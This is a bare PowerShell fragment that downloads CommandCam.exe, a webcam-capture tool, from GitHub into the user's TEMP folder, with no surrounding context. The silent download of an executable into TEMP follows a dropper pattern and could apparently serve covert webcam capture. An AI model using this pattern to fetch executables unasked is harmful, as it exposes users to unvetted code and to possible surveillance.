$url1 ="https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
$output1 = “$env:TEMP\CommandCam.exe”
Invoke-WebRequest -Uri $url1 -OutFile $output1
